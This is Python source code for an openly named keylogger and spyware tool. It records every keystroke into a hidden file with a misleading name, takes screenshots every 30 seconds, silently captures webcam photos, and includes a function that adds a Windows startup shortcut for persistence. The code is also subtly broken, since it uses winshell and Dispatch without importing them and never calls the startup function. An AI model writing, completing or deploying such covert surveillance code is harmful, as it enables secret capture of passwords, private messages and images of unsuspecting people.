# Dependencies: PYTHON3-PYNPUT
# PYTHON3-PYGAME

# To make it as a startup app for windows
import os
import sys
from PIL import ImageGrab

# Create two threads, one for listening to keyboard strokes and one for taking pictures
import threading 

# Date and Time module
import datetime

# Webcam Accessor
import pygame
import pygame.camera

# Keyboard listener
from pynput.keyboard import Listener

# Wait function
import time


# Store keystrokes in \keylog.txt
keys_info = "important_files_do_not_delete_pls_ty.txt"
file_path = r""

# Make file hidden
extend = "."

# Picture taking mechanism 
# Find webcams

pygame.camera.init()
camlist = pygame.camera.list_cameras()


def startup():

    script_path = os.path.abspath(sys.argv[0])
    pythonw_path = os.path.join(sys.exec_prefix, "pythonw.exe")

       
    startup_folder = winshell.startup()
    shortcut_path = os.path.join(startup_folder, "MyKeyloggerShortcut.lnk")

    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = pythonw_path
    shortcut.Arguments = f'"{script_path}"'
    shortcut.WorkingDirectory = os.path.dirname(script_path)
    shortcut.IconLocation = script_path
    shortcut.save()



# function to take screenshots every 30 seconds

def take_screenshot():
    while True:
        print("another success")
        screenshot = ImageGrab.grab()
        dtime = datetime.datetime.now()
        dtime_string = dtime.strftime('%Y-%m-%d_%H-%M-%S') + ".png"
        screenshot.save(dtime_string)
        time.sleep(30)

# check if webcam exists

def webcam_pic():
    while(True):
        time.sleep(5)
        if camlist:
            print("success")
            # Store the current date and time 
            dtime = datetime.datetime.now()
            dtime_string = dtime.strftime('%Y-%m-%d_%H:%M:%S')+".jpg"
            cam = pygame.camera.Camera(camlist[0], (640, 480)) 
            cam.start()
            image = cam.get_image()
            pygame.image.save(image,dtime_string)
            cam.stop()


# Defining threads
# note: keylogging already has a thread generated automatically
# starting the camera thread

screenshot_thread = threading.Thread(target=take_screenshot)
webcampic = threading.Thread(target=webcam_pic)
webcampic.start()
screenshot_thread.start()
# Keylogging mechanism


keys_log = []

def on_press(key):
    global keys_log
    keys_log.append(key)

    write_file(keys_log)
    keys_log = []

def write_file(keys):
    key_actions = {
        "Key.space": " ",
        "Key.enter": " <key_pressed_user_enter>\n",
        "Key.backspace": "<",
        "Key.caps_lock": "<key_pressed_user_capsLock>",
        "Key.crtl": " <key_pressed_user_crtl>",
        "Key.alt": " <key_pressed_user_alt>",
        #macos/windows
        #we don't really need anything else 
        "Key.cmd": " <key_pressed_user_cmd> "
    }
    
    with open(file_path + extend + "important_files_do_not_delete_pls_ty.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(key_actions.get(k, k if "Key" not in k else ""))

with Listener(on_press=on_press, on_release=None) as listener:
    listener.join()


   
